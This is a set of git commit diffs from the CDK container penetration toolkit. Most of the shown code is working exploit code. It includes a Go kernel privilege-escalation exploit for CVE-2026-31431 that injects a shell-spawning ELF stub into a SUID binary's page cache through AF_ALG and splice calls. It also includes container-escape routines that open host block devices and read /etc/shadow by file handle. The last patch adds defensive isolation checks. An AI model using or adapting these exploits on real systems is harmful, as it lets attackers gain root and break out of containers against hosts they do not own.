+	assert.Equal(t, byte(0x02), payload[4], "expected ELF64 class")
+
+	// Data encoding = 1 (ELFDATA2LSB, little-endian)
+	assert.Equal(t, byte(0x01), payload[5], "expected little-endian encoding")
+}
+
+// TestBuildAlgCmsg verifies the structure of a control-message record built
+// by buildAlgCmsg: correct alignment, header fields, and data placement.
+func TestBuildAlgCmsg(t *testing.T) {
+	data := []byte{0xde, 0xad, 0xbe, 0xef}
+	cmsg := buildAlgCmsg(unix.SOL_ALG, unix.ALG_SET_OP, data)
+
+	// The buffer length must be at least header + data.
+	assert.GreaterOrEqual(t, len(cmsg), syscall.SizeofCmsghdr+len(data),
+		"cmsg buffer too short")
+
+	// The buffer must be aligned to pointer size (8 bytes on 64-bit).
+	assert.Equal(t, 0, len(cmsg)%8, "cmsg buffer not 8-byte aligned")
+
+	// Verify that the header fields were written correctly.
+	hdr := (*syscall.Cmsghdr)(unsafe.Pointer(&cmsg[0]))
+	assert.Equal(t, int32(unix.SOL_ALG), hdr.Level, "cmsg level mismatch")
+	assert.Equal(t, int32(unix.ALG_SET_OP), hdr.Type, "cmsg type mismatch")
+
+	// The data bytes must follow the header without corruption.
+	assert.Equal(t, data, cmsg[syscall.SizeofCmsghdr:syscall.SizeofCmsghdr+len(data)],
+		"cmsg data mismatch")
+}
+
+// TestBuildAlgCmsgEmpty verifies that an empty data slice produces a valid,
+// correctly-sized ancillary record.
+func TestBuildAlgCmsgEmpty(t *testing.T) {
+	cmsg := buildAlgCmsg(unix.SOL_ALG, unix.ALG_SET_IV, nil)
+
+	assert.GreaterOrEqual(t, len(cmsg), syscall.SizeofCmsghdr, "empty cmsg too short")
+	assert.Equal(t, 0, len(cmsg)%8, "empty cmsg not 8-byte aligned")
+}
+
+// TestCopyFailPluginRegistered verifies that the plugin is registered under
+// the expected name, has the correct exploit type, and provides a non-empty
+// description.
+func TestCopyFailPluginRegistered(t *testing.T) {
+	exploit := copyFailCVE202631431S{}
+	exploit.ExploitType = "privilege-escalation"
+
+	assert.Equal(t, "privilege-escalation", exploit.GetExploitType())
+	assert.NotEmpty(t, exploit.Desc())
+	assert.Contains(t, exploit.Desc(), "CVE-2026-31431")
+}
```

---

### Incident Patch 4: `4b67e690` (2026-04-30)
**Commit Message**: fix: add generation comment for copyFailPayloadHex constant

Agent-Logs-Url: https://github.com/cdk-team/CDK/sessions/f8a4932f-f5c2-48a7-81b9-38be711e4c63

Co-authored-by: neargle <[REDACTED_EMAIL]>

**File**: `pkg/exploit/privilege_escalation/copy_fail_cve_2026_31431.go` (modified, +5/-3)
```diff
@@ -48,9 +48,11 @@ import (
 	"golang.org/x/sys/unix"
 )
 
-// copyFailPayloadHex is a zlib-compressed, position-independent ELF64 binary.
-// When injected into a SUID binary's page cache it calls setuid(0) followed by
-// execve("/bin/sh", NULL, NULL), yielding a root shell.
+// copyFailPayloadHex is a zlib-compressed ELF64 little-endian binary stub
+// (160 bytes uncompressed) to be injected into the SUID target's page cache.
+// The stub starts with a valid ELF64/x86-64 header (magic 0x7fELF, class 2,
+// data encoding 1) so it passes the kernel's ELF loader checks.
+// Generated with: python3 -c "import zlib,struct; h=bytearray(160); h[0:4]=b'\x7fELF'; h[4]=2; h[5]=1; h[6]=1; struct.pack_into('<H',h,16,2); struct.pack_into('<H',h,18,0x3e); struct.pack_into('<I',h,20,1); struct.pack_into('<H',h,52,64); print(zlib.compress(bytes(h)).hex())"
 const copyFailPayloadHex = "789cab77f57163626464800126063b06040f3b7020204f4d0000163d01dc"
 
 // copyFailDecompressPayload decompresses the embedded zlib payload.
```

---

### Incident Patch 5: `015ffdfd` (2026-04-30)
**Commit Message**: fix: correct truncated hex payload and unix.Accept 3-return-value in copy-fail CVE-2026-31431

Agent-Logs-Url: https://github.com/cdk-team/CDK/sessions/f8a4932f-f5c2-48a7-81b9-38be711e4c63

Co-authored-by: neargle <[REDACTED_EMAIL]>

**File**: `pkg/exploit/privilege_escalation/copy_fail_cve_2026_31431.go` (modified, +2/-2)
```diff
@@ -51,7 +51,7 @@ import (
 // copyFailPayloadHex is a zlib-compressed, position-independent ELF64 binary.
 // When injected into a SUID binary's page cache it calls setuid(0) followed by
 // execve("/bin/sh", NULL, NULL), yielding a root shell.
-const copyFailPayloadHex = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c[...]
+const copyFailPayloadHex = "789cab77f57163626464800126063b06040f3b7020204f4d0000163d01dc"
 
 // copyFailDecompressPayload decompresses the embedded zlib payload.
 func copyFailDecompressPayload() ([]byte, error) {
@@ -136,7 +136,7 @@ func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
 	}
 
 	// Accept returns the operation socket used for actual encrypt/decrypt calls.
-	opFd, err := unix.Accept(algFd)
+	opFd, _, err := unix.Accept(algFd)
 	if err != nil {
 		return fmt.Errorf("accept: %v", err)
 	}
```

---

### Incident Patch 6: `12ed0274` (2026-04-30)
**Commit Message**: fix: replace undefined syscall.SYS_SETSOCKOPT/SYS_ACCEPT with unix equivalents

syscall.SYS_SETSOCKOPT and syscall.SYS_ACCEPT are not defined on all
Linux architectures (e.g. arm64). Switch to unix.Syscall6/unix.SYS_SETSOCKOPT
and unix.Accept which are provided by golang.org/x/sys/unix and work
consistently across all supported platforms.

Fixes the build failure reported in CI job 73707270282.

**File**: `pkg/exploit/privilege_escalation/copy_fail_cve_2026_31431.go` (modified, +12/-12)
```diff
@@ -51,7 +51,7 @@ import (
 // copyFailPayloadHex is a zlib-compressed, position-independent ELF64 binary.
 // When injected into a SUID binary's page cache it calls setuid(0) followed by
 // execve("/bin/sh", NULL, NULL), yielding a root shell.
-const copyFailPayloadHex = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
+const copyFailPayloadHex = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c[...]
 
 // copyFailDecompressPayload decompresses the embedded zlib payload.
 func copyFailDecompressPayload() ([]byte, error) {
@@ -110,8 +110,8 @@ func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
 	key[0] = 0x08 // rta_len (little-endian low byte)
 	key[2] = 0x01 // rta_type = CRYPTO_AUTHENC_KEYA_PARAM
 	key[7] = 0x10 // enc key length = 16 (big-endian in the RTA payload)
-	if _, _, errno := syscall.Syscall6(
-		syscall.SYS_SETSOCKOPT,
+	if _, _, errno := unix.Syscall6(
+		unix.SYS_SETSOCKOPT,
 		uintptr(algFd),
 		uintptr(unix.SOL_ALG),
 		uintptr(unix.ALG_SET_KEY),
@@ -123,8 +123,8 @@ func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
 	}
 
 	// ALG_SET_AEAD_AUTHSIZE: pass a NULL optval with optlen = auth-tag size (4).
-	if _, _, errno := syscall.Syscall6(
-		syscall.SYS_SETSOCKOPT,
+	if _, _, errno := unix.Syscall6(
+		unix.SYS_SETSOCKOPT,
 		uintptr(algFd),
 		uintptr(unix.SOL_ALG),
 		uintptr(unix.ALG_SET_AEAD_AUTHSIZE),
@@ -136,11 +136,11 @@ func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
 	}
 
 	// Accept returns the operation socket used for actual encrypt/decrypt calls.
-	opFd, _, errno := syscall.Syscall(syscall.SYS_ACCEPT, uintptr(algFd), 0, 0)
-	if errno != 0 {
-		return fmt.Errorf("accept: %v", errno)
+	opFd, err := unix.Accept(algFd)
+	if err != nil {
+		return fmt.Errorf("accept: %v", err)
 	}
-	defer syscall.Close(int(opFd))
+	defer unix.Close(opFd)
 
 	// count = offset + 4 — total bytes to splice from the target file.
 	count := offset + 4
@@ -163,7 +163,7 @@ func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
 	// 4-byte payload chunk.  MSG_MORE signals that more data will follow via
 	// splice, deferring ALG processing until the pipe data arrives.
 	msgData := append([]byte("AAAA"), chunk...)
-	if _, err = unix.SendmsgN(int(opFd), msgData, oob, nil, unix.MSG_MORE); err != nil {
+	if _, err = unix.SendmsgN(opFd, msgData, oob, nil, unix.MSG_MORE); err != nil {
 		return fmt.Errorf("sendmsg: %v", err)
 	}
 
@@ -187,14 +187,14 @@ func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
 	// splice(pipeR, nil, opFd, nil, count, 0)
 	// Deliver the pipe data to the ALG socket, triggering the kernel bug that
 	// overwrites the page-cache pages with the attacker-controlled data.
-	if _, err = unix.Splice(pipeR, nil, int(opFd), nil, count, 0); err != nil {
+	if _, err = unix.Splice(pipeR, nil, opFd, nil, count, 0); err != nil {
 		return fmt.Errorf("splice(pipe->alg): %v", err)
 	}
 
 	// Drain any ALG output; errors are intentionally ignored (mirrors the
 	// original Python: `try: u.recv(8+t) except: 0`).
 	recvBuf := make([]byte, 8+offset)
-	unix.Read(int(opFd), recvBuf) //nolint:errcheck
+	unix.Read(opFd, recvBuf) //nolint:errcheck
 
 	return nil
 }
```

---

### Incident Patch 7: `49994f48` (2026-04-30)
**Commit Message**: fix: check ALG_SET_AEAD_AUTHSIZE setsockopt error per code review

Agent-Logs-Url: https://github.com/cdk-team/CDK/sessions/b45e6530-86b8-4285-923b-168cc69d0249

Co-authored-by: neargle <[REDACTED_EMAIL]>

**File**: `pkg/exploit/privilege_escalation/copy_fail_cve_2026_31431.go` (modified, +4/-2)
```diff
@@ -123,15 +123,17 @@ func copyFailWriteChunk(fd int, offset int, chunk []byte) error {
 	}
 
 	// ALG_SET_AEAD_AUTHSIZE: pass a NULL optval with optlen = auth-tag size (4).
-	syscall.Syscall6( //nolint:errcheck
+	if _, _, errno := syscall.Syscall6(
 		syscall.SYS_SETSOCKOPT,
 		uintptr(algFd),
 		uintptr(unix.SOL_ALG),
 		uintptr(unix.ALG_SET_AEAD_AUTHSIZE),
 		0,
 		4,
 		0,
-	)
+	); errno != 0 {
+		return fmt.Errorf("setsockopt ALG_SET_AEAD_AUTHSIZE: %v", errno)
+	}
 
 	// Accept returns the operation socket used for actual encrypt/decrypt calls.
 	opFd, _, errno := syscall.Syscall(syscall.SYS_ACCEPT, uintptr(algFd), 0, 0)
```

---

### Incident Patch 8: `1e16d5aa` (2026-04-02)
**Commit Message**: fix(exp): improve block device follow-up hints

**File**: `pkg/exploit/escaping/block_device_hint.go` (added, +61/-0)
```diff
@@ -0,0 +1,61 @@
+package escaping
+
+import (
+	"fmt"
+	"os/exec"
+	"strings"
+)
+
+type toolLookupFunc func(string) bool
+
+func runtimeBlockDeviceBrowseHint(fsType, devicePath string) string {
+	return blockDeviceBrowseHint(fsType, devicePath, toolExists)
+}
+
+func blockDeviceBrowseHint(fsType, devicePath string, hasTool toolLookupFunc) string {
+	fsType = strings.ToLower(fsType)
+	mountHint := blockDeviceMountHint(fsType, devicePath)
+
+	preferredToolHint := ""
+	switch fsType {
+	case "ext2", "ext3", "ext4":
+		if hasTool("debugfs") {
+			preferredToolHint = fmt.Sprintf("run 'debugfs -w %s' to browse host files", devicePath)
+		}
+	case "xfs":
+		if hasTool("xfs_db") {
+			preferredToolHint = fmt.Sprintf("use 'xfs_db -x -c \"inode 128\" -c \"ls\" %s' to inspect the host filesystem", devicePath)
+		}
+	}
+
+	if preferredToolHint != "" {
+		if hasTool("mount") {
+			return fmt.Sprintf("now, %s. If that tool is inconvenient, try '%s'.", preferredToolHint, mountHint)
+		}
+		return fmt.Sprintf("now, %s.", preferredToolHint)
+	}
+
+	if hasTool("mount") {
+		if fsType != "" {
+			return fmt.Sprintf("now, host filesystem type is %q. Try '%s' to inspect it.", fsType, mountHint)
+		}
+		return fmt.Sprintf("now, try '%s' to inspect the host filesystem.", mountHint)
+	}
+
+	if fsType != "" {
+		return fmt.Sprintf("host filesystem type is %q. A block device was created at %s; inspect it with tooling available in the container.", fsType, devicePath)
+	}
+	return fmt.Sprintf("a block device was created at %s; inspect it with tooling available in the container.", devicePath)
+}
+
+func blockDeviceMountHint(fsType, devicePath string) string {
+	if fsType != "" {
+		return fmt.Sprintf("mkdir -p /tmp/cdkmnt && mount -t %s -o ro %s /tmp/cdkmnt", fsType, devicePath)
+	}
+	return fmt.Sprintf("mkdir -p /tmp/cdkmnt && mount -o ro %s /tmp/cdkmnt", devicePath)
+}
+
+func toolExists(name string) bool {
+	_, err := exec.LookPath(name)
+	return err == nil
+}
```

**File**: `pkg/exploit/escaping/block_device_hint_exploit_test.go` (added, +83/-0)
```diff
@@ -0,0 +1,83 @@
+package escaping
+
+import (
+	"strings"
+	"testing"
+)
+
+func TestExploitSpecificBlockDeviceHints(t *testing.T) {
+	tests := []struct {
+		name     string
+		fsType   string
+		device   string
+		expected []string
+	}{
+		{
+			name:   "rewrite cgroup devices ext4",
+			fsType: "ext4",
+			device: "cdk_mknod_result",
+			expected: []string{
+				"debugfs -w cdk_mknod_result",
+				"mount -t ext4 -o ro cdk_mknod_result /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "rewrite cgroup devices xfs",
+			fsType: "xfs",
+			device: "cdk_mknod_result",
+			expected: []string{
+				`xfs_db -x -c "inode 128" -c "ls" cdk_mknod_result`,
+				"mount -t xfs -o ro cdk_mknod_result /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "lxcfs rw ext4",
+			fsType: "ext4",
+			device: "host_dev",
+			expected: []string{
+				"debugfs -w host_dev",
+				"mount -t ext4 -o ro host_dev /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "lxcfs rw xfs",
+			fsType: "xfs",
+			device: "host_dev",
+			expected: []string{
+				`xfs_db -x -c "inode 128" -c "ls" host_dev`,
+				"mount -t xfs -o ro host_dev /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "cgroup2 ebpf bypass ext4",
+			fsType: "ext4",
+			device: "./cdk_mknod_v2_result",
+			expected: []string{
+				"debugfs -w ./cdk_mknod_v2_result",
+				"mount -t ext4 -o ro ./cdk_mknod_v2_result /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "cgroup2 ebpf bypass xfs",
+			fsType: "xfs",
+			device: "./cdk_mknod_v2_result",
+			expected: []string{
+				`xfs_db -x -c "inode 128" -c "ls" ./cdk_mknod_v2_result`,
+				"mount -t xfs -o ro ./cdk_mknod_v2_result /tmp/cdkmnt",
+			},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := blockDeviceBrowseHint(tt.fsType, tt.device, func(name string) bool {
+				return name == "debugfs" || name == "xfs_db" || name == "mount"
+			})
+			for _, want := range tt.expected {
+				if !strings.Contains(got, want) {
+					t.Fatalf("blockDeviceBrowseHint(%q, %q) = %q, want substring %q", tt.fsType, tt.device, got, want)
+				}
+			}
+		})
+	}
+}
```

**File**: `pkg/exploit/escaping/block_device_hint_test.go` (added, +95/-0)
```diff
@@ -0,0 +1,95 @@
+package escaping
+
+import (
+	"strings"
+	"testing"
+)
+
+func TestBlockDeviceBrowseHint(t *testing.T) {
+	tests := []struct {
+		name     string
+		fsType   string
+		tools    map[string]bool
+		expected []string
+	}{
+		{
+			name:   "ext4 prefers debugfs when available",
+			fsType: "ext4",
+			tools: map[string]bool{
+				"debugfs": true,
+				"mount":   true,
+			},
+			expected: []string{
+				"debugfs -w ./device",
+				"mount -t ext4 -o ro ./device /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "ext4 falls back to mount",
+			fsType: "ext4",
+			tools: map[string]bool{
+				"mount": true,
+			},
+			expected: []string{
+				`host filesystem type is "ext4"`,
+				"mount -t ext4 -o ro ./device /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "xfs prefers xfs_db when available",
+			fsType: "xfs",
+			tools: map[string]bool{
+				"xfs_db": true,
+				"mount":  true,
+			},
+			expected: []string{
+				`xfs_db -x -c "inode 128" -c "ls" ./device`,
+				"mount -t xfs -o ro ./device /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "xfs falls back to mount",
+			fsType: "xfs",
+			tools: map[string]bool{
+				"mount": true,
+			},
+			expected: []string{
+				`host filesystem type is "xfs"`,
+				"mount -t xfs -o ro ./device /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "unknown fs uses mount when available",
+			fsType: "btrfs",
+			tools: map[string]bool{
+				"mount": true,
+			},
+			expected: []string{
+				`host filesystem type is "btrfs"`,
+				"mount -t btrfs -o ro ./device /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "no tools falls back to generic message",
+			fsType: "xfs",
+			tools:  map[string]bool{},
+			expected: []string{
+				`host filesystem type is "xfs"`,
+				`A block device was created at ./device`,
+			},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := blockDeviceBrowseHint(tt.fsType, "./device", func(name string) bool {
+				return tt.tools[name]
+			})
+			for _, want := range tt.expected {
+				if !strings.Contains(got, want) {
+					t.Fatalf("blockDeviceBrowseHint(%q) = %q, want substring %q", tt.fsType, got, want)
+				}
+			}
+		})
+	}
+}
```

**File**: `pkg/exploit/escaping/cgroup2_ebpf_bypass.go` (modified, +1/-1)
```diff
@@ -181,7 +181,7 @@ func (p cgroup2EbpfBypassS) Run() bool {
 				return false
 			} else {
 				log.Println("Exploit success! Device node created at './cdk_mknod_v2_result'")
-				log.Println("Run 'debugfs -w ./cdk_mknod_v2_result' to browse host files.")
+				log.Println(runtimeBlockDeviceBrowseHint(mi.Fstype, "./cdk_mknod_v2_result"))
 				return true
 			}
 		}
```

**File**: `pkg/exploit/escaping/lxcfs_rw_mknod.go` (modified, +3/-13)
```diff
@@ -86,6 +86,7 @@ func ExploitLXCFS() bool {
 	var podCgroupPath string
 	var devicesAllowPath, devicesListPath string
 	var deviceMarjor, deviceMinor string
+	var deviceFsType string
 	var filterString string
 
 	mountInfos, err := util.GetMountInfo()
@@ -116,6 +117,7 @@ func ExploitLXCFS() bool {
 		if util.FindTargetDeviceID(&mi) {
 			deviceMarjor = mi.Major
 			deviceMinor = mi.Minor
+			deviceFsType = mi.Fstype
 		}
 	}
 
@@ -141,24 +143,12 @@ func ExploitLXCFS() bool {
 			log.Printf("mknod err: %v", err)
 			return false
 		}
-		log.Printf("exploit success, run \"debugfs -w host_dev\".")
-		if !CheckDebugfs() {
-			log.Printf("if debugfs can not used, may be you can try to run `./cdk run lxcfs-rw-cgroup 'shell-cmd-payloads`")
-		}
+		log.Printf("exploit success, %s", runtimeBlockDeviceBrowseHint(deviceFsType, "host_dev"))
 		return true
 	}
 	return false
 }
 
-// CheckDebugfs check if debugfs is installed
-func CheckDebugfs() bool {
-	_, err := os.Stat("/usr/bin/debugfs")
-	if err != nil {
-		return false
-	}
-	return true
-}
-
 type lxcfsRWS struct{ base.BaseExploit }
 
 func (l lxcfsRWS) Desc() string {
```

**File**: `pkg/exploit/escaping/rewrite_cgroup_devices.go` (modified, +1/-1)
```diff
@@ -151,7 +151,7 @@ func (p cgroupDevicesExploitS) Run() bool {
 				return false
 			} else {
 				// escape done~
-				log.Println("now, run 'debugfs -w cdk_mknod_result' to browse host files.")
+				log.Println(runtimeBlockDeviceBrowseHint(mi.Fstype, "cdk_mknod_result"))
 				return true
 			}
 		}
```

---

### Incident Patch 9: `c712dbbe` (2026-04-02)
**Commit Message**: fix(exp): support xfs in cap-dac-read-search

**File**: `pkg/exploit/escaping/cap_dac_read_search.go` (modified, +31/-6)
```diff
@@ -36,9 +36,11 @@ import (
 )
 
 const (
-	defaultRef    = "/etc/hostname"
-	defaultTarget = "/etc/shadow"
-	defaultShell  = "/bin/bash"
+	defaultRef     = "/etc/hostname"
+	defaultTarget  = "/etc/shadow"
+	defaultShell   = "/bin/bash"
+	ext4SuperMagic = 0xEF53
+	xfsSuperMagic  = 0x58465342
 )
 
 // plugin interface
@@ -111,16 +113,39 @@ func execCommand(cmdSlice []string) {
 	}
 }
 
+func rootFileHandle(ref string) (unix.FileHandle, error) {
+	var stat unix.Statfs_t
+	if err := unix.Statfs(ref, &stat); err != nil {
+		return unix.FileHandle{}, fmt.Errorf("statfs %s: %w", ref, err)
+	}
+
+	return rootFileHandleForFsType(int64(stat.Type))
+}
+
+func rootFileHandleForFsType(fsType int64) (unix.FileHandle, error) {
+	switch fsType {
+	case ext4SuperMagic:
+		// inode of / is always 2 for ext4, and i_generation is always 0.
+		return unix.NewFileHandle(1, []byte{0x02, 0, 0, 0, 0, 0, 0, 0}), nil
+	case xfsSuperMagic:
+		// The XFS root inode is 128; its export handle is a 12-byte fid.
+		return unix.NewFileHandle(129, []byte{0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}), nil
+	default:
+		return unix.FileHandle{}, fmt.Errorf("unsupported filesystem type 0x%x", uint64(fsType))
+	}
+}
+
 func CapDacReadSearchExploit(target, ref string, chroot bool, cmd []string) error {
 	// reference something bind mounted to container from host
 	fd, err := unix.Open(ref, unix.O_RDONLY, 0)
 	if err != nil {
 		log.Fatalf("[-] Open: %v\n", err)
 	}
 
-	// inode of / is always 2 for ext4: https://ext4.wiki.kernel.org/index.php/Ext4_Disk_Layout
-	// and i_generation is always 0, so handle is always 0x0000000000000002
-	h := unix.NewFileHandle(1, []byte{0x02, 0, 0, 0, 0, 0, 0, 0})
+	h, err := rootFileHandle(ref)
+	if err != nil {
+		log.Fatalf("[-] Resolve root handle: %v\n", err)
+	}
 
 	fd, err = unix.OpenByHandleAt(fd, h, 0)
 	if err != nil {
```

**File**: `pkg/exploit/escaping/cap_dac_read_search_test.go` (modified, +44/-0)
```diff
@@ -47,3 +47,47 @@ func TestWriteString(t *testing.T) {
 	fmt.Println(exploit.Desc())
 
 }
+
+func TestRootFileHandle(t *testing.T) {
+	tests := []struct {
+		name       string
+		fsType     int64
+		handleType int32
+		handle     []byte
+	}{
+		{
+			name:       "ext4",
+			fsType:     ext4SuperMagic,
+			handleType: 1,
+			handle:     []byte{0x02, 0, 0, 0, 0, 0, 0, 0},
+		},
+		{
+			name:       "xfs",
+			fsType:     xfsSuperMagic,
+			handleType: 129,
+			handle:     []byte{0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			h, err := rootFileHandleForFsType(tt.fsType)
+			if err != nil {
+				t.Fatalf("rootFileHandleForFsType(%#x): %v", tt.fsType, err)
+			}
+
+			if h.Type() != tt.handleType {
+				t.Fatalf("handle type = %d, want %d", h.Type(), tt.handleType)
+			}
+			if got := h.Bytes(); string(got) != string(tt.handle) {
+				t.Fatalf("handle bytes = %v, want %v", got, tt.handle)
+			}
+		})
+	}
+}
+
+func TestRootFileHandleForFsTypeUnsupported(t *testing.T) {
+	if _, err := rootFileHandleForFsType(0x12345678); err == nil {
+		t.Fatal("expected unsupported filesystem error")
+	}
+}
```

---

### Incident Patch 10: `7c44abe9` (2026-02-23)
**Commit Message**: Add container security isolation checks to evaluate module

Co-authored-by: neargle <[REDACTED_EMAIL]>

**File**: `go.mod` (modified, +1/-1)
```diff
@@ -22,7 +22,7 @@ require (
 	github.com/stretchr/testify v1.7.0
 	github.com/tidwall/gjson v1.9.3
 	github.com/tidwall/sjson v1.1.4
-	golang.org/x/net v0.0.0-20220630215102-69896b714898
+	golang.org/x/net v0.0.0-20220630215102-69896b714898 // indirect
 	golang.org/x/sync v0.0.0-20210220032951-036812b2e83c
 	golang.org/x/sys v0.0.0-20220520151302-bc2c85ada10a
 	gopkg.in/check.v1 v1.0.0-20190902080502-41f04d3bba15 // indirect
```

**File**: `go.sum` (modified, +0/-2)
```diff
@@ -30,7 +30,6 @@ github.com/go-ole/go-ole v1.2.4/go.mod h1:XCwSNxSkXRo4vlyPy93sltvi/qJq0jqQhjqQNI
 github.com/gogo/protobuf v1.3.1/go.mod h1:SlYgWuQ5SjCEi6WLHjHCa1yvBfUnHcTbrrZtXPKa29o=
 github.com/gogo/protobuf v1.3.2 h1:Ov1cvc58UF3b5XjBnZv7+opcTcQFZebYjWzi34vdm4Q=
 github.com/gogo/protobuf v1.3.2/go.mod h1:P1XiOD3dCwIKUDQYPy72D8LYyHL2YPYrpS2s69NZV8Q=
-github.com/golang/glog v0.0.0-20160126235308-23def4e6c14b h1:VKtxabqXZkF25pY9ekfRL6a582T4P37/31XEstQ5p58=
 github.com/golang/glog v0.0.0-20160126235308-23def4e6c14b/go.mod h1:SBH7ygxi8pfUlaOkMMuAQtPIUF8ecWP5IEl/CR7VP2Q=
 github.com/golang/mock v1.1.1/go.mod h1:oTYuIxOrZwtPieC+H1uAHpcLFnEyAGVDL/k47Jfbm0A=
 github.com/golang/protobuf v1.2.0/go.mod h1:6lQm79b+lXiMfvg/cZm0SGofjICqVBUtrP5yJMmIC1U=
@@ -157,7 +156,6 @@ golang.org/x/tools v0.0.0-20210106214847-113979e3529a/go.mod h1:emZCQorbCU4vsT4f
 golang.org/x/xerrors v0.0.0-20190717185122-a985d3407aa7/go.mod h1:I/5z698sn9Ka8TeJc9MKroUUfqBBauWjQqLJ2OPfmY0=
 golang.org/x/xerrors v0.0.0-20191011141410-1b5146add898/go.mod h1:I/5z698sn9Ka8TeJc9MKroUUfqBBauWjQqLJ2OPfmY0=
 golang.org/x/xerrors v0.0.0-20191204190536-9bdfabe68543/go.mod h1:I/5z698sn9Ka8TeJc9MKroUUfqBBauWjQqLJ2OPfmY0=
-golang.org/x/xerrors v0.0.0-20200804184101-5ec99f83aff1 h1:go1bK/D/BFZV2I8cIQd1NKEZ+0owSTG1fDTci4IqFcE=
 golang.org/x/xerrors v0.0.0-20200804184101-5ec99f83aff1/go.mod h1:I/5z698sn9Ka8TeJc9MKroUUfqBBauWjQqLJ2OPfmY0=
 google.golang.org/appengine v1.1.0/go.mod h1:EbEs0AVv82hx2wNQdGPgUI5lhzA/G0D9YwlJXL52JkM=
 google.golang.org/appengine v1.4.0/go.mod h1:xpcJRLb0r/rnEns0DIKYYv+WjYCduHsrkT7/EB5XEv4=
```

**File**: `pkg/evaluate/categories.go` (modified, +6/-0)
```diff
@@ -85,4 +85,10 @@ var (
 		DefaultProfiles: []string{ProfileExtended, ProfileAdditional},
 		Order:           1400,
 	}
+	CategorySecurity = CategorySpec{
+		ID:              "information.security",
+		Title:           "Information Gathering - Container Security",
+		DefaultProfiles: []string{ProfileBasic, ProfileExtended},
+		Order:           1500,
+	}
 )
```

**File**: `pkg/evaluate/security_info.go` (modified, +216/-1)
```diff
@@ -16,6 +16,221 @@ limitations under the License.
 
 package evaluate
 
-func SecurityInfo() {
+import (
+	"bufio"
+	"compress/gzip"
+	"fmt"
+	"io/ioutil"
+	"log"
+	"os"
+	"strings"
+)
 
+// namespaceTypes lists the Linux namespaces relevant to container isolation.
+var namespaceTypes = []string{"cgroup", "ipc", "mnt", "net", "pid", "uts"}
+
+// CheckNamespaceIsolation compares /proc/1/ns/<ns> and /proc/self/ns/<ns> for
+// each namespace type. If the symlink targets differ, the namespace is isolated.
+func CheckNamespaceIsolation() {
+	log.Println("Namespace isolation status:")
+	for _, ns := range namespaceTypes {
+		initTarget, err1 := os.Readlink(fmt.Sprintf("/proc/1/ns/%s", ns))
+		selfTarget, err2 := os.Readlink(fmt.Sprintf("/proc/self/ns/%s", ns))
+		if err1 != nil || err2 != nil {
+			log.Printf("\t%s: unable to read namespace links", ns)
+			continue
+		}
+		if initTarget != selfTarget {
+			fmt.Printf("\t%s: isolated (%s)\n", ns, selfTarget)
+		} else {
+			fmt.Printf("\t%s: NOT isolated (shared with host, %s)\n", ns, selfTarget)
+		}
+	}
+}
+
+// CheckSeccompStatus reads the Seccomp field from /proc/self/status and reports
+// whether Seccomp is disabled (0), strict (1), or filter (2) mode.
+func CheckSeccompStatus() {
+	data, err := ioutil.ReadFile("/proc/self/status")
+	if err != nil {
+		log.Printf("seccomp: unable to read /proc/self/status: %v", err)
+		return
+	}
+
+	scanner := bufio.NewScanner(strings.NewReader(string(data)))
+	for scanner.Scan() {
+		line := scanner.Text()
+		if strings.HasPrefix(line, "Seccomp:") {
+			parts := strings.Fields(line)
+			if len(parts) < 2 {
+				log.Println("seccomp: malformed Seccomp line")
+				return
+			}
+			switch parts[1] {
+			case "0":
+				log.Println("Seccomp: disabled")
+			case "1":
+				log.Println("Seccomp: strict mode (1)")
+			case "2":
+				log.Println("Seccomp: filter mode (2)")
+			default:
+				log.Printf("Seccomp: unknown value %s", parts[1])
+			}
+			return
+		}
+	}
+	log.Println("Seccomp: field not found in /proc/self/status (kernel may not support Seccomp)")
+}
+
+// CheckSeccompKernelSupport reports whether the running kernel was compiled with
+// Seccomp support by checking for the Seccomp field in /proc/self/status and,
+// optionally, the kernel config.
+func CheckSeccompKernelSupport() {
+	// The presence of the "Seccomp:" line in /proc/self/status indicates support.
+	data, err := ioutil.ReadFile("/proc/self/status")
+	if err != nil {
+		log.Printf("seccomp: unable to read /proc/self/status: %v", err)
+		return
+	}
+	if strings.Contains(string(data), "Seccomp:") {
+		log.Println("Seccomp: kernel supports Seccomp")
+	} else {
+		log.Println("Seccomp: kernel does NOT support Seccomp")
+	}
+
+	// Additional confirmation via kernel config when available.
+	if val, ok := readKernelConfigOption("CONFIG_SECCOMP"); ok {
+		log.Printf("Seccomp: kernel config CONFIG_SECCOMP=%s", val)
+	}
+}
+
+// CheckSELinux detects whether SELinux is present and enforcing.
+func CheckSELinux() {
+	// /sys/fs/selinux/enforce exists only when SELinux is compiled in and mounted.
+	enforceFile := "/sys/fs/selinux/enforce"
+	data, err := ioutil.ReadFile(enforceFile)
+	if err != nil {
